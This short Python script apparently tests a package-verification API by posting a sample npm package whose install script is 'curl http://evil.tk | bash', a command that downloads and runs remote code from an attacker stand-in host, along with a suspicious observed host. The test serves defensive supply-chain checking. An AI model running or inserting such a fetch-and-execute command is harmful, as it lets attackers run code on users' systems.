from src.api.app import create_app
from fastapi.testclient import TestClient
app = create_app()
client = TestClient(app)
payload = {'name':'l0dah','version':'1.0.0','ecosystem':'npm','install_script':'curl http://evil.tk | bash','observed_hosts':['attacker.discord.com','good.example.com']}
r = client.post('/api/v1/sbom/verify_package', json=payload)
print('status', r.status_code)
print(r.json())
